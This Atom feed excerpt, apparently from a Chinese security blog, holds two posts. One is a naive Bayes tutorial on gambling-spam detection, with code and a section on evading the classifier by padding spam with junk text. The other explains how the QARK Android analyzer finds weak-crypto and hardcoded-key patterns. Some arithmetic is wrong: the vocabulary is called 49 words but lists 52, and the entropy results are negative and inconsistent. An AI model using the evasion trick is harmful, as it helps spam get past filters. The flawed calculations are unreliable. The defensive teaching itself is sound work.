<p>奖金将在您完成首存后即可存入您的账户。真人荷官 体育博彩 欢迎来到全新番摊游戏！</p>
</blockquote>
</li>
<li><p>正常类别：</p>
<blockquote>
<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
<p>在公安机关持续不断的打击下，六合彩、私彩赌博活动由最初的公开、半公开状态转入地下。</p>
</blockquote>
</li>
</ul>
<p>要计算每个词语在不同类别下的概率，首先需要一个词袋集合，集合包含了训练数据中所有非重复词语(_vocab_list)，参考函数_get_vocab_list：</p>
<pre><code>def _get_vocab_list(self):
    &apos;&apos;&apos;
    Get a list contain all unique non stop words belongs to train_data
    Set up:
    self.vocab_list:
        [
            &apos;What&apos;, &apos;lovely&apos;, &apos;day&apos;,
            &apos;like&apos;, &apos;gamble&apos;, &apos;love&apos;, &apos;dog&apos;, &apos;sunkist&apos;
        ]
    &apos;&apos;&apos;
    vocab_set = set()
    all_train_data = &apos;&apos;.join([v for _, v in self._train_data])
    token = Token(text=all_train_data, lan=self.lan, split=self.split)
    vocab_set = vocab_set | set(token.tokenizer)
    self._vocab_list = list(vocab_set)
</code></pre><p>默认使用<a href="https://github.com/fxsjy/jieba" rel="external nofollow noopener noreferrer" target="_blank">结巴分词</a>进行中文分词（你可以定制分词函数），例如第一个数据：</p>
<blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
</blockquote>
<p>分词后会得到：</p>
<pre><code>[&apos;根据&apos;, &apos;您&apos;, &apos;所&apos;, &apos;选择&apos;, &apos;的&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;，&apos;, &apos;您&apos;, &apos;必须&apos;, &apos;在&apos;, &apos;娱乐场&apos;, &apos;完成&apos;, &apos;总金额&apos;, &apos;（&apos;, &apos;存款&apos;, &apos;+&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;）&apos;, &apos;16&apos;, &apos;倍&apos;, &apos;或&apos;, &apos;15&apos;, &apos;倍&apos;, &apos;流水&apos;, &apos;之后&apos;, &apos;，&apos;, &apos;方可&apos;, &apos;申请&apos;, &apos;提款&apos;, &apos;。&apos;]
</code></pre><p>我们去掉包含在stop_word.dat中的词语，stop_word.dat包含了汉语中的常见的转折词：</p>
<blockquote>
<p>如果，但是，并且，不只…</p>
</blockquote>
<p>这些词语对于我们分类器没有用处，因为任何类别都会出现这些词语。接下来再去掉长度等于1的字，第一个训练数据剩下：</p>
<pre><code>[&apos;选择&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;娱乐场&apos;, &apos;总金额&apos;, &apos;存款&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;16&apos;, &apos;15&apos;, &apos;流水&apos;, &apos;申请&apos;, &apos;提款&apos;]
</code></pre><p>遍历4个句子最终得到长度为49的词袋集合(vocab_list)：（这里使用的集合是无序的，所以你得到的结果顺序可能不同）</p>
<pre><code>[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
</code></pre><p>得到词袋之后，再次使用训练数据，并把每个训练数据都转变成一个长度为49的一维向量</p>
<pre><code>def _get_vocab_matrix(self):
    &apos;&apos;&apos;
    Convert strings to vector depends on vocal_list
    &apos;&apos;&apos;
    array_list = []
    for k, data in self._train_data:
        return_vec = np.zeros(len(self._vocab_list))
        token = Token(text=data, lan=self.lan, split=self.split)
        for i in token.tokenizer:
            if i in self._vocab_list:
                return_vec[self._vocab_list.index(i)] += 1
        array_list.append(return_vec)
    self._matrix_lst = array_list
</code></pre><blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
</blockquote>
<p>对应转变成：</p>
<pre><code># 长度为49的一维向量
[1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
</code></pre><p>其中的1分别对应着数据分词后的词语在词袋中出现的次数。接下来将所有训练数据的一维向量组合成列表_matrix_list</p>
<pre><code>[
    [1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
    [0, 1, 1, 0, 0, 0, ..., 0, 0, 0]
    ...
]
</code></pre><p><strong>要计算每个词语在不同类别下的概率，只需要把词语出现的次数除以该类别的所有词语的总数，</strong> <a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>出于效率的考虑使用了numpy的矩阵运算。</p>
<pre><code>def _training(self):
    &apos;&apos;&apos;
    Native bayes training
    &apos;&apos;&apos;
    self._ps_vector = []
    # 防止有词语在其他类别训练数据中没有出现过，最后的P(句子|类别)乘积就会为零，所以给每个词语一个初始的非常小的出现概率，设置vector默认值为1，cal对应为2
    # vector: 默认值为1的一维数组
    # cal: 默认的分母，计算该类别所有有效词语的总数
    # num: 计算P(赌博), P(句子)
    vector_list = [{
        &apos;vector&apos;: np.ones(len(self._matrix_lst[0])),
        &apos;cal&apos;: 2.0, &apos;num&apos;: 0.0} for i in range(len(self.CLASSIFY))]
    for k, v in enumerate(self.train_data):
        vector_list[v[0]][&apos;num&apos;] += 1
        # vector加上对应句子的词向量，最后把整个向量除于cal，就得到每个词语在该类别的概率。
        # [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] (根据您所选择的...)
        # [0, 1, 1, 0, 0, 0, ..., 0, 0, 0] (奖金将在您完成...)
        #                   +
        # [1, 1, 1, 1, 1, 1, ..., 1, 1, 1] 
        vector_list[v[0]][&apos;vector&apos;] += self._matrix_lst[k]
        vector_list[v[0]][&apos;cal&apos;] += sum(self._matrix_lst[k])
    for i in range(len(self.CLASSIFY)):
        # 每个词语的概率为[2, 2, 2, 1, 2, 1, ..., 2, 1, 2]/cal
        self._ps_vector.append((
            np.log(vector_list[i][&apos;vector&apos;]/vector_list[i][&apos;cal&apos;]),
            np.log(vector_list[i][&apos;num&apos;]/len(self.train_data))))
</code></pre><p>遍历完所有训练数据之后，会得到两个类别对应的每个词语的概率向量，(为了防止python的小数相乘溢出，这里的概率都是取np.log()对数之后得到的值)：</p>
<pre><code>#赌博
([-2.80336038, -2.80336038, -2.80336038, -3.49650756, -3.49650756,
   -2.80336038, -3.49650756, -2.39789527, -2.80336038, -3.49650756,
   -3.49650756, -3.49650756, -2.80336038, -2.80336038, -3.49650756,
   -3.49650756, -3.49650756, -3.49650756, -2.80336038, -2.80336038,
   -3.49650756, -2.80336038, -3.49650756, -2.80336038, -2.80336038,
   -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038,
   -2.80336038, -2.39789527, -3.49650756, -3.49650756, -3.49650756,
   -2.80336038, -3.49650756, -3.49650756, -2.80336038, -3.49650756,
   -3.49650756, -2.80336038, -2.80336038, -2.80336038, -3.49650756,
   -2.80336038, -2.80336038, -3.49650756, -2.39789527, -2.80336038,
   -3.49650756, -2.80336038]), 0.5)

# 正常
([-3.25809654, -3.25809654, -3.25809654, -2.56494936, -2.56494936,
   -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
   -2.56494936, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
   -2.56494936, -2.56494936, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654,
   -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936,
   -3.25809654, -2.56494936, -2.56494936, -3.25809654, -2.56494936,
   -2.56494936, -3.25809654, -3.25809654, -3.25809654, -2.56494936,
   -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
   -2.56494936, -3.25809654]), 0.5)

# 词袋集合 
[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
</code></pre><p>结合向量和词袋集合来看，<strong>提款</strong>，<strong>存入</strong>，<strong>游戏</strong>这几个词是赌博的概率要大于正常的概率</p>
<pre><code>#赌博 提款，存入，游戏
[-2.80336038, -2.80336038, -2.80336038]

#正常 提款，存入，游戏
[-3.25809654, -3.25809654, -3.25809654]
</code></pre><p>符合我们的常识，接下来就可以进行输入句子的分类了。</p>
<h3 id="判断类别"><a href="#判断类别" class="headerlink" title="判断类别"></a>判断类别</h3><p>训练完数据，得到词语对应概率之后，判断类别就非常简单，<strong>只需要把输入句子进行相同的分词，然后计算对应的词语对应的概率的乘积即可，</strong>得到乘积最大的就是最有可能的类别。输入句子：<br>​<br>    欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。</p>
<p>先根据原先的词袋集合，先转变为一维向量</p>
<pre><code># 词袋集合
[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
# 长度为49的一维向量
[0, 0, 1, 0, 1, ...]
</code></pre><p>然后与分别与两个概率向量相乘，求和，并加上对应的类别占比，对应的代码：</p>
<pre><code>def _bayes_classify(self):
    &apos;&apos;&apos;
    Calculate the probability of different category
    &apos;&apos;&apos;
    possibility_vector = []
    log_list = []
    # self._ps_vector: ([-3.44, -3.56, -2.90], 0.4)
    for i in self._ps_vector:
        # 计算每个词语对应概率的乘积
        final_vector = i[0] * self.word_vec
        # 获取对分类器影响度最大的词语
        word_index = np.nonzero(final_vector)
        non_zero_word = np.array(self._vocab_list)[word_index]
        # non_zero_vector: [-7.3, -8]
        non_zero_vector = final_vector[word_index]
        possibility_vector.append(non_zero_vector)
        log_list.append(sum(final_vector) + i[1])
    possibility_array = np.array(possibility_vector)
    max_val = max(log_list)
    for i, j in enumerate(log_list):
        # 输出最大概率的类别
        if j == max_val:
            max_array = possibility_array[i, :]
            left_array = np.delete(possibility_array, i, 0)
            sub_array = np.zeros(max_array.shape)
            # 通过曼哈顿举例，计算影响度最大的词语
            for k in left_array:
                sub_array += max_array - k
            return self._update_category(log_list), \
                sorted(
                    list(zip(non_zero_word, sub_array)),
                    key=lambda x: x[1], reverse=True)
</code></pre><p>通过计算：</p>
<blockquote>
<p>P(赌博|句子) = sum([0, 0, 1, 0, 1, …] * [-2.80336038, -2.80336038, -2.80336038, …]) + P(赌博) = 0.85</p>
<p>P(正常|句子) = sum([0, 0, 1, 0, 1, …] * [-3.25809654, -3.25809654, -3.25809654, …])+ P(正常) = 0.15</p>
</blockquote>
<p>最终得到P(赌博|句子) &gt; P(正常|句子)，所以分类器判断这个句子是赌博类别。</p>
<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。&apos;)
&gt;&gt;&gt; result.percentage
[(&apos;gamble.dat&apos;, 0.85), (&apos;normal.dat&apos;, 0.15)]
&gt;&gt;&gt; result.word_list
[(&apos;六合彩&apos;, 0.96940055718810347), (&apos;游戏&apos;, 0.96940055718810347), (&apos;欢迎&apos;, 0.56393544907993931)]
</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h3><p>测试方法有留出法(hold-out)，k折交叉验证法(cross validation)，自助法(bootstrapping)，这里我们使用留出法，测试脚本默认每次从所有数据中选出60个句子当成测试数据，剩下的当成训练数据。重复进行测试10次。运行测试脚本</p>
<pre><code>&gt;&gt;&gt; python runanalysis.py
This may takes some time, Go get a coffee :D.
Building prefix dict from the default dictionary ...
Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache
Loading model cost 0.914 seconds.
Prefix dict has been built succesfully.
+Cherry---------------+------------+------------+
| Confusion matrix    | gamble.dat | normal.dat |
+---------------------+------------+------------+
| (Real)gamble.dat    |        249 |          0 |
| (Real)normal.dat    |         13 |        338 |
| Error rate is 2.17% |            |            |
+---------------------+------------+------------+
</code></pre><p>输出分类测试数据的平均错误率为2.17%，同时我们可以通过混淆矩阵对分类器进行分析：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/QQ%E6%88%AA%E5%9B%BE20180408144928.jpg" alt=""></p>
<ul>
<li><p>查全率(recall)（能找出赌博类别句子的概率）</p>
<p>  真阳性/(真阳性+假阴性)<br>  249 / 249 = 100%</p>
</li>
<li><p>查准率(precision)（分类为赌博类别中的句子，确实是赌博类别的概率）</p>
<p>  真阳性/(真阳性+假阳性)<br>  249 / (249 + 13) = 95%</p>
</li>
</ul>
<p>如果业务的需求是尽可能找到潜在的阳性数据（例如癌症初检）那么就要求高查全率，不过对应的，高查全率会导致查准率降低。（可以这样理解，假如所有句子都判断成赌博类别，那么所有确实是赌博类别的句子确实都被检测到了，但是查准率变得很低。）影响查全率以及查准率的一点是训练数据数量的比例，日常的句子中，赌博类别的句子与正常类别的句子比例可能是1:50。也就是说随便给出一个句子，不用看内容，那么它有98%是正常的。不过在某些情况下，例如热门评论区打广告的用户就很多，那么这个比例就变成1:10或者1:20，这个比例是根据具体业务而调整的。<strong>训练数据也应该遵循这个比例，但是实现中，我们必须要找到大量独立分布的数据才能遵循这个比例，这就是机器学习数据常遇到的不均衡分类问题。要解决这个问题，可以引入Adaboost算法动态调整每个词语的权重。</strong>。我们可以通过-p参数输出ROC曲线：</p>
<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/auc.png" alt="roc"></p>
<p>ROC曲线横坐标代表的是假阳性（没有问题却被判断为有问题），纵坐标代表的是真阳性（有问题而且被判断出来），一个优秀的分类器尽可能维持高真阳性以及低假阳性。一般来说，如果一个分类器的ROC曲线包含了另外一个分类器的ROC曲线，代表此分类器在此数据集的分类效果更好。</p>
<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><ul>
<li><a href="#上下文关联">上下文关联</a></li>
<li><a href="#分类器绕过">分类器绕过</a></li>
</ul>
<h3 id="上下文关联"><a href="#上下文关联" class="headerlink" title="上下文关联"></a>上下文关联</h3><p>当我们计算P(输入句子|类别)的时候，我们把输入句子分成了词语的集合，<strong>同时假定了输入句子中词语与词语之间没有上下文关系，</strong>其实这是不完全正确的，例如：</p>
<pre><code>警方召开了全省集中打击赌博违法犯罪活动...
</code></pre><p>从常识句子的上下文判断，<strong>集中打击</strong>出现在<strong>赌博违法犯罪</strong>之前的概率，要比<strong>召开</strong>出现在<strong>赌博违法犯罪</strong>之前的概率高，不过当我们把输入句子分成词语的集合的时候，把它们看成每个词语都是独立分布的。这也是此算法称为朴素贝叶斯的原因，如果我们有大量的数据集，计算出<strong>每个词语对应词袋模型其他词语的出现概率值的话，可以提高检测的准确率。</strong></p>
<p>要注意的是，训练数据选择与最后进行分类的数据必须尽量关联，如果要检测的句子与训练数据有非常大的差别，例如检测的内容包含大量的英文单词，但是训练数据却没有，那么分类器就无法进行正确的分类。同时，输入句子过短的话，分类器也无法很好地进行分类。因为分类的结果会很容易被其中的一两个词语所影响。</p>
<h4 id="分类器绕过"><a href="#分类器绕过" class="headerlink" title="分类器绕过"></a>分类器绕过</h4><p>分类器无法分辨重复内容或部分无意义文本，输入句子：</p>
<blockquote>
<p>车厘子车厘子车厘子车厘子</p>
<p>加入博彩121加qq看头像，很为温暖文科楼课文你问你看我呢额可能我呃让你听客啊啊爱看就是是过分过分你问人人官方代购极为。</p>
</blockquote>
<p>前两个是垃圾内容，但是即使我们添加垃圾内容的数据集，也很难判断正确。最后一个前一小段是赌博类别的句子，后面一长串是无意义或者正常类别的句子，分类器综合判断它是正确的句子。<strong>解决这个问题我们可以用一个简单的方法，计算句子的熵，也就是无序程度。</strong>每个句子都有合理的长度以及合理的无序程度，什么意思呢？句子的长度大约遵循正态分布，极长（不包含标点符号）或者极短的句子出现的概率比较低，同时，通常一个句子中的词语不会重复出现很多次，它的无序程度是在某个范围的。当我们看到前两个句子，因为它们词语的重复度非常高，所以句子的无序度非常低，如何计算句子的无序程度呢？</p>
<ol>
<li><p>我们找两个输入句子作为例子，先把输入句子进行分词</p>
<blockquote>
<p>车厘子是一只非常可爱的猫咪</p>
<p>车厘子车厘子车厘子车厘子</p>
</blockquote>
<pre><code>[车厘子，非常，可爱，猫咪]
[车厘子，车厘子，车厘子，车厘子]
</code></pre></li>
<li><p>计算每个词语出现的次数除于句子的词语数量：</p>
<p> P(车厘子) = P(非常) = P(可爱) = P(猫咪) = 1/4 (句子1)</p>
<p> P(车厘子) = 4/4 = 1 (句子2)</p>
<p> 通过计算熵的公式，带入每个概率值，最后除于句子的词语数量</p>
<pre><code>H = -sum(p(x)log2p(x))

H1 = ((1/4 * -2) - (1/4 * -2) - (1/4 * -2) - (1/4 * -2)) / 4= -2 / 4 = -1/2

H2 = 0
</code></pre></li>
</ol>
<p>可以看到，在同样的句子长度下，第一个句子的熵为-2，第二个为0，可以设置一个熵的范围，如果低于该值，代表句子可能是垃圾数据。一般来说，先进行垃圾文本过滤，然后进行贝叶斯模型的分类，在工程中会有更好的效果。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>理解了贝叶斯分类的原理，你就能根据自己的业务需求，来判断使用什么分词函数，使用哪些stop_word，可以定制适合业务的数据集，同时根据输出的被错误分类的数据以及混淆矩阵，做出对应的调整。</strong>如果有什么疑问，欢迎留言。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;贝叶斯模型在机器学习以及人工智能中都有出现，&lt;a href=&quot;https://github.com/Sunkist-Cherry/cherr
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="贝叶斯分类" scheme="http://www.future-sec.com/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>QARK工具的介绍和原理分析</title>
    <link href="http://www.future-sec.com/introducing-qark.html"/>
    <id>http://www.future-sec.com/introducing-qark.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:13.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB（Android调试桥）命令，以帮助验证其检测到的潜在漏洞。它甚至可以动态地创建一个定制的测试应用程序，以即用APK的形式，专门设计来展示它发现的潜在问题。<br>QARK的设计是基于社区的，可供所有人免费使用。QARK被设计出来的主要目的和大多数的自动化检测工具一样是教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>•    python 2.7.<br>•    JRE 1.6+（最好1.7+）<br>•    Ubuntu环境（最好）<br>•    未加固的测试APK；<br>•    一台root过的手机<br>在前提条件中，有提到未加固的APK，从简介中，我们就提到该工具就是一个静态代码分析的工具，在其中QARK的脚本中是没有脱壳的脚本，所以是需要未加固的APK，其中的ubuntu环境不是唯一的，但是我只在ubuntu成功过，所以我建议试用该环境。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>QARK是一款易于使用的工具，能够找到Android应用程序中的常见安全漏洞。与商业产品不同，它可以100％免费使用。QARK提供教育信息，允许安全审查人员找到对漏洞的精确和深入的解释。在反编译APK时，QARK可以自动使用多个反编译器，利用它们的组合输出来产生出色的结果。最后，QARK与传统工具相比的主要优势仅仅是指出可能存在的漏洞，它可以产生ADB命令甚至功能齐全的APK，将假设的漏洞转化为“POC”漏洞利用。<br>包含在此工具尝试查找的安全漏洞类型中的有：<br>•    无意中导出的组件<br>•    未妥善保护的导出组件<br>•    易受拦截或窃听的intent<br>•    不正确的x.509证书验证<br>•    创建事件可读或事件可写的文件<br>•    可能泄漏数据的Activity<br>•    粘滞的intent的使用<br>•    不安全地创建了Pending Intents<br>•    发送不安全的广播Intent<br>•    嵌入在源中的私钥<br>•    弱密码学使用不当或不适用<br>•    潜在可利用的WebView配置<br>•    导出偏好活动<br>•    Tapjacking<br>•    启用备份的应用程序<br>•    可调试的应用程序<br>•    支持过时API版本的应用程序，具有已知的漏洞</p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>前面我们说过该工具就是静态代码分析的工具，所以首先我打开相应的qark.py脚本文件,其可以发现刚开始就使用到unpackAPK脚本，然后打开相应的unpackAPK,py，发现相应aapt和dex2jar，这里就可以知道还是老方法，对apk进行反编译，然后在进行相应的dex2jar把dex转换为jar文件，之后在进行查看源码。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image001.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image002.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image003.png" alt=""> </p>
<p>然后就是相应的代码静态分析，这里就需要对于检测项目的了解，其实说到底就是一个关键代码查找和匹配，因为这些检测项目大部分引起的原因就是编写代码没有注意到相关的安全措施，例如其中的组件暴露就是，组件的属性exported：设置为ture或者没有设置，则默认为true，这就会导致相应的组件暴露。<br>我们查看下mouble文件夹里面，基本上所有的检测项目都是这里的检测检测脚本。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image004.png" alt=""><br>我们就分析其中的cryptoFlaws.py这个脚本，从字面意思就是密码缺陷，那这个部分就是针对于移动应用加解密子之类的风险。我们直接打开来查看其中方法。<br>这里我们看到相应的寻找ECB的特殊关键字，这个是检测AES和DES是否存在弱加密（ECB模式）的风险。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image005.png" alt=""><br>这个地方是匹配PRIVATE\sKEY的1特殊关键字，寻找相应的加密算法的私钥，这个地方的私钥如果存在且是以明文形式存在，这个就是加密算法的密钥硬编码风险，会导致相关的加密算法被破解。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image006.png" alt=""><br>这里还有一个地方，但是方法被注释掉了，这个是匹配SecureRandom.setseed（）方法，这个是伪随机数的一个风险点。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image007.png" alt=""><br> 大部分的原理都是类似的。所以其他的脚本就看各位自己去分析。</p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>QARK有两种模式：1.交互模式 2.无缝模式<br>交互模式使用户能够交互地一个接一个地选择选项。而无缝模式允许我们用一个命令完成整个工作。<br>我们主要看看交互模式的实际应用。<br>输入python qark.py<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image008.png" alt=""><br>接着会有选择apk或者soure，这些都是通过数字来进行选择。继续下去会有输入路径或者通过设备来进行检测。我们选择1，然后底下就开始提示是否导出mainfirst文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image009.png" alt=""><br>接下来就直接导出相应的mainfist文件，这其实就是直接反编译获取到的。接下来就是先从mainfirst文件进行分析，分析相应组件暴露和allowback和debuggable等相关的风险点。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image010.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image011.png" alt=""><br>接下里，我们继续查看，直接检测broadcast广播是否有附带相应的敏感信息，然后就是相应的脚本进行检测，例如x509证书检验，这些都是该工具具有的代码静态分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image012.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image013.png" alt=""><br>最后会在qark的本身目录中的report.html文件，这个文件类似于mobsf生成的界面。这里面就是会把刚刚经过检测的所有风险都以报告的形式打印出来，都会在相应的选项中，详细的告诉你风险点存在的位置，以及相应的危害。<br>但是在这里我们只是看到很稀少的数据，其实这些数据只是mainfist文件暴露出来的风险点，但是代码中的分析根本没有进行分析。问题出在于apk本身，这是一个有进行加固的apk，我之前说过这个工具无法进行相应的脱壳，所以导致无法获取到相应的代码，就无法进行相应的分析，所以其他数据就是空的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在安装的过程会有一个问题就是python no module named _curses的问题，这个问题最后解决了，经过对比python2.6 ，终于发现，原来 pythong2.7/lib-dynload 里没有相应的 curses 库，_curses_panel.so，_curses.so。说到底就是去缺少文件，所以此时你将python2.6 的 这2个so文件拷贝到 pythong2.7 的lib-dynload 文件夹下， 就解决了问题。或者你可以下载ncurses文件，然后重新跑下python就可以了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image014.png" alt=""><br>我们前面也说过这款工具是为了教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。<br>其实通过对于QARK的了解，我们不难看出这就是和大多数自动化工具一样就是，感觉就像个多了些脚步的Mobsf，作为一个安全评估人员，其实再多的检测工具也是辅助，我们仍然需要进行自己的分析，有些风险点也不一定是准确的，所以我们是需要好好利用该工具。</p>
<p>参考的文章：<br><a href="http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref" rel="external nofollow noopener noreferrer" target="_blank">http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref</a><br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a><br>工具下载链接：<br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
